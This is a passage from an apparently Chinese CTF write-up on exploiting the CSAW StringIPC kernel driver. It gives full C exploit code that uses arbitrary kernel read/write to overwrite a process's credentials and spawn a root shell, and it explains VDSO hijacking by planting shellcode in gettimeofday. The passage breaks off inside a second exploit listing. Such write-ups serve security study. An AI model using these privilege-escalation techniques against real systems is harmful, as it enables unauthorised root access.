class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/prctl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/stat.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> CSAW_IOCTL_BASE 0x77617363</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> CSAW_ALLOC_CHANNEL CSAW_IOCTL_BASE + 1</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> CSAW_OPEN_CHANNEL CSAW_IOCTL_BASE + 2</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> CSAW_GROW_CHANNEL CSAW_IOCTL_BASE + 3</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> CSAW_SHRINK_CHANNEL CSAW_IOCTL_BASE + 4</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> CSAW_READ_CHANNEL CSAW_IOCTL_BASE + 5</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> CSAW_WRITE_CHANNEL CSAW_IOCTL_BASE + 6</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> CSAW_SEEK_CHANNEL CSAW_IOCTL_BASE + 7</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> CSAW_CLOSE_CHANNEL CSAW_IOCTL_BASE + 8</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">alloc_channel_args</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line"><span class="keyword">size_t</span> buf_size;</span><br><span class="line"><span class="keyword">int</span> id;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">open_channel_args</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line"><span class="keyword">int</span> id;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">shrink_channel_args</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line"><span class="keyword">int</span> id;</span><br><span class="line"><span class="keyword">size_t</span> size;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">read_channel_args</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line"><span class="keyword">int</span> id;</span><br><span class="line"><span class="keyword">char</span> *buf;</span><br><span class="line"><span class="keyword">size_t</span> count;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">write_channel_args</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line"><span class="keyword">int</span> id;</span><br><span class="line"><span class="keyword">char</span> *buf;</span><br><span class="line"><span class="keyword">size_t</span> count;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">seek_channel_args</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line"><span class="keyword">int</span> id;</span><br><span class="line"><span class="keyword">loff_t</span> index;</span><br><span class="line"><span class="keyword">int</span> whence;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">close_channel_args</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line"><span class="keyword">int</span> id;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">print_hex</span><span class="params">(<span class="keyword">char</span> *buf, <span class="keyword">size_t</span> len)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">int</span> i;</span><br><span class="line"><span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; ((len / <span class="number">8</span>) * <span class="number">8</span>); i += <span class="number">8</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;0x%lx&quot;</span>, *(<span class="keyword">size_t</span> *)(buf + i));</span><br><span class="line"><span class="keyword">if</span> (i % <span class="number">16</span>)</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot; &quot;</span>);</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">int</span> fd = <span class="number">-1</span>;</span><br><span class="line"><span class="keyword">int</span> result = <span class="number">0</span>;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">alloc_channel_args</span> <span class="title">alloc_args</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">shrink_channel_args</span> <span class="title">shrink_args</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">seek_channel_args</span> <span class="title">seek_args</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">read_channel_args</span> <span class="title">read_args</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">close_channel_args</span> <span class="title">close_args</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">write_channel_args</span> <span class="title">write_args</span>;</span></span><br><span class="line"><span class="keyword">size_t</span> addr = <span class="number">0xffff880000000000</span>;</span><br><span class="line"><span class="keyword">size_t</span> real_cred = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">size_t</span> cred = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">size_t</span> target_addr;</span><br><span class="line"><span class="keyword">int</span> root_cred[<span class="number">12</span>];</span><br><span class="line"><span class="comment">// set target in task_struct</span></span><br><span class="line">setvbuf(<span class="built_in">stdout</span>, <span class="number">0LL</span>, <span class="number">2</span>, <span class="number">0LL</span>);</span><br><span class="line"><span class="keyword">char</span> *buf = <span class="built_in">malloc</span>(<span class="number">0x1000</span>);</span><br><span class="line"><span class="keyword">char</span> target[<span class="number">16</span>];</span><br><span class="line"><span class="built_in">strcpy</span>(target, <span class="string">&quot;trytofind196082&quot;</span>);</span><br><span class="line">prctl(PR_SET_NAME, target);</span><br><span class="line">fd = open(<span class="string">&quot;/dev/csaw&quot;</span>, O_RDWR);</span><br><span class="line"><span class="keyword">if</span> (fd &lt; <span class="number">0</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">puts</span>(<span class="string">&quot;[-] open error&quot;</span>);</span><br><span class="line"><span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">alloc_args.buf_size = <span class="number">0x100</span>;</span><br><span class="line">alloc_args.id = <span class="number">-1</span>;</span><br><span class="line">ioctl(fd, CSAW_ALLOC_CHANNEL, &amp;alloc_args);</span><br><span class="line"><span class="keyword">if</span> (alloc_args.id == <span class="number">-1</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">puts</span>(<span class="string">&quot;[-] alloc_channel error&quot;</span>);</span><br><span class="line"><span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;[+] now we get a channel %d\n&quot;</span>, alloc_args.id);</span><br><span class="line">shrink_args.id = alloc_args.id;</span><br><span class="line">shrink_args.size = <span class="number">0x100</span> + <span class="number">1</span>;</span><br><span class="line">ioctl(fd, CSAW_SHRINK_CHANNEL, &amp;shrink_args);</span><br><span class="line"><span class="built_in">puts</span>(<span class="string">&quot;[+] we can read and write any momery&quot;</span>);</span><br><span class="line"><span class="keyword">for</span> (; addr &lt; <span class="number">0xffffc80000000000</span>; addr += <span class="number">0x1000</span>)</span><br><span class="line">&#123;</span><br><span class="line">seek_args.id = alloc_args.id;</span><br><span class="line">seek_args.index = addr - <span class="number">0x10</span>;</span><br><span class="line">seek_args.whence = SEEK_SET;</span><br><span class="line">ioctl(fd, CSAW_SEEK_CHANNEL, &amp;seek_args);</span><br><span class="line">read_args.id = alloc_args.id;</span><br><span class="line">read_args.buf = buf;</span><br><span class="line">read_args.count = <span class="number">0x1000</span>;</span><br><span class="line">ioctl(fd, CSAW_READ_CHANNEL, &amp;read_args);</span><br><span class="line">result = memmem(buf, <span class="number">0x1000</span>, target, <span class="number">16</span>);</span><br><span class="line"><span class="comment">// printf(&quot;0x%lx&quot;,addr);</span></span><br><span class="line"><span class="keyword">if</span> (result)</span><br><span class="line">&#123;</span><br><span class="line">cred = *(<span class="keyword">size_t</span> *)(result - <span class="number">0x8</span>);</span><br><span class="line">real_cred = *(<span class="keyword">size_t</span> *)(result - <span class="number">0x10</span>);</span><br><span class="line"><span class="keyword">if</span> ((cred || <span class="number">0xff00000000000000</span>) &amp;&amp; (real_cred == cred))</span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">// printf(&quot;[]%lx[]&quot;,result-(int)(buf));</span></span><br><span class="line">target_addr = addr + result - (<span class="keyword">int</span>)(buf);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;[+]found task_struct 0x%lx\n&quot;</span>, target_addr);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;[+]found cred 0x%lx\n&quot;</span>, real_cred);</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (result == <span class="number">0</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">puts</span>(<span class="string">&quot;not found , try again &quot;</span>);</span><br><span class="line"><span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">44</span>; i++)</span><br><span class="line">&#123;</span><br><span class="line">seek_args.id = alloc_args.id;</span><br><span class="line">seek_args.index = cred - <span class="number">0x10</span> + <span class="number">4</span> + i;</span><br><span class="line">seek_args.whence = SEEK_SET;</span><br><span class="line">ioctl(fd, CSAW_SEEK_CHANNEL, &amp;seek_args);</span><br><span class="line">root_cred[<span class="number">0</span>] = <span class="number">0</span>;</span><br><span class="line">write_args.id = alloc_args.id;</span><br><span class="line">write_args.buf = (<span class="keyword">char</span> *)root_cred;</span><br><span class="line">write_args.count = <span class="number">1</span>;</span><br><span class="line">ioctl(fd, CSAW_WRITE_CHANNEL, &amp;write_args);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (getuid() == <span class="number">0</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;[+]now you are r00t,enjoy ur shell\n&quot;</span>);</span><br><span class="line">system(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">puts</span>(<span class="string">&quot;[-] there must be something error ... &quot;</span>);</span><br><span class="line"><span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="劫持VDSO"><a href="#劫持VDSO" class="headerlink" title="劫持VDSO"></a>劫持VDSO</h2><p>VDSO就是Virtual Dynamic Shared Object。这个.so文件不在磁盘上，而是在内核里头。内核把包含某.so的内存页在程序启动的时候映射入其内存空间，对应的程序就可以当普通的.so来使用里头的函数。</p><p>vdso里的函数主要有五个</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">clock_gettime<span class="number">0000000000000</span>A10</span><br><span class="line">gettimeofday<span class="number">0000000000000</span>C80</span><br><span class="line">time<span class="number">0000000000000</span>DE0</span><br><span class="line">getcpu<span class="number">0000000000000E00</span></span><br><span class="line">start<span class="number">0000000000000940</span></span><br></pre></td></tr></table></figure><p>VDSO所在的页，在内核态是可读、可写的，在用户态是可读、可执行的</p><h3 id="利用方式-1"><a href="#利用方式-1" class="headerlink" title="利用方式"></a>利用方式</h3><p>首先，利用内存读找到内存中vdso的逻辑页，由于内核态有写入的权限，因此利用任意写写入shellcode覆盖其中某些函数。</p><p>其次，等待某root权限的进程调用这个函数就可以利用反弹shell完成提权。</p><p>根据上面的内存映射图，再结合vdso在内核附近，我们可以确定vdso范围<code>0xffffffff80000000</code>——<code>0xffffffffffffefff</code></p><p>所以思路很明显，在内核中修改函数地址为shellcode就可，所以现在就是怎么找到函数地址</p><p>首先，获得其中gettimeofday字符串到vdso的其实位置的偏移</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">get_gettimeofday_str_offset</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">size_t</span> vdso_addr = getauxval(AT_SYSINFO_EHDR);</span><br><span class="line"><span class="keyword">char</span> *name = <span class="string">&quot;gettimeofday&quot;</span>;</span><br><span class="line"><span class="keyword">if</span> (!vdso_addr)</span><br><span class="line">&#123;</span><br><span class="line">errExit(<span class="string">&quot;[-]error get name&#x27;s offset&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">size_t</span> name_addr = memmem(vdso_addr, <span class="number">0x1000</span>, name, <span class="built_in">strlen</span>(name));</span><br><span class="line"><span class="keyword">if</span> (name_addr &lt; <span class="number">0</span>)</span><br><span class="line">&#123;</span><br><span class="line">errExit(<span class="string">&quot;[-]error get name&#x27;s offset&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> name_addr - vdso_addr;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>随后在内存映射图中获取的位置进行爆破</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> (; addr &lt; <span class="number">0xffffffffffffefff</span>; addr += <span class="number">0x1000</span>)</span><br><span class="line">&#123;</span><br><span class="line">    seek_args.id = alloc_args.id;</span><br><span class="line">    seek_args.index = addr - <span class="number">0x10</span>;</span><br><span class="line">    seek_args.whence = SEEK_SET;</span><br><span class="line">    ioctl(fd, CSAW_SEEK_CHANNEL, &amp;seek_args);</span><br><span class="line">    read_args.id = alloc_args.id;</span><br><span class="line">    read_args.buf = buf;</span><br><span class="line">    read_args.count = <span class="number">0x1000</span>;</span><br><span class="line">    ioctl(fd, CSAW_READ_CHANNEL, &amp;read_args);</span><br><span class="line">    <span class="keyword">if</span> ((!<span class="built_in">strcmp</span>(<span class="string">&quot;gettimeofday&quot;</span>, buf + offset)))</span><br><span class="line">    &#123;</span><br><span class="line">        result = addr;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;[+] found vdso %lx\n&quot;</span>, result);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里是一页一页的搜索并且由于我们知道字符串的偏移，所以我们可以直接进行对比，所以效率还是十分高效的</p><p>接下来就是思考在什么地方写入shellcode了，我们目前是不知道函数的执行代码在哪里，我们可以使用下面的方法拿到vdso.so文件放进ida分析</p><p><img                       lazyload                     src="/images/loading.svg"                     data-src="/images/image-20220803171941359.png"                      alt="image-20220803171941359"                ></p><p><img                       lazyload                     src="/images/loading.svg"                     data-src="/images/image-20220803171959631.png"                      alt="image-20220803171959631"                ></p><p><img                       lazyload                     src="/images/loading.svg"                     data-src="/images/image-20220803172237986.png"                      alt="image-20220803172237986"                ></p><p>可以看到gettimeofday函数的代码段是在偏移为0xc80的地方，所以我们覆盖这里为shellcode即可。</p><p><strong>为什么从一开始就一直说这个gettimeofday函数呢？</strong></p><p>上面说了这一攻击方式需要有一个有root权限的程序去执行这里面的函数，所以我们就需要一个不停的调用vdso内函数的一个程序。</p><p>在真实环境下crontab会不停的调用搞gettimeofday函数，但是题目是qemu的模拟环境所以没有这个程序，但是题目有一个模拟的程序</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="keyword">while</span>(<span class="number">1</span>)&#123;</span><br><span class="line"><span class="built_in">puts</span>(<span class="string">&quot;111&quot;</span>);</span><br><span class="line">sleep(<span class="number">1</span>);</span><br><span class="line">gettimeofday();</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>最后综上，得出exp：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/prctl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/stat.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/auxv.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> CSAW_IOCTL_BASE 0x77617363</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> CSAW_ALLOC_CHANNEL CSAW_IOCTL_BASE + 1</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> CSAW_OPEN_CHANNEL CSAW_IOCTL_BASE + 2</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> CSAW_GROW_CHANNEL CSAW_IOCTL_BASE + 3</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> CSAW_SHRINK_CHANNEL CSAW_IOCTL_BASE + 4</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> CSAW_READ_CHANNEL CSAW_IOCTL_BASE + 5</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> CSAW_WRITE_CHANNEL CSAW_IOCTL_BASE + 6</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> CSAW_SEEK_CHANNEL CSAW_IOCTL_BASE + 7</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> CSAW_CLOSE_CHANNEL CSAW_IOCTL_BASE + 8</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">alloc_channel_args</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line"><span class="keyword">size_t</span> buf_size;</span><br><span class="line"><span class="keyword">int</span> id;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">open_channel_args</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line"><span class="keyword">int</span> id;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">shrink_channel_args</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line"><span class="keyword">int</span> id;</span><br><span class="line"><span class="keyword">size_t</span> size;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">read_channel_args</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line"><span class="keyword">int</span> id;</span><br><span class="line"><span class="keyword">char</span> *buf;</span><br><span class="line"><span class="keyword">size_t</span> count;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">write_channel_args</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line"><span class="keyword">int</span> 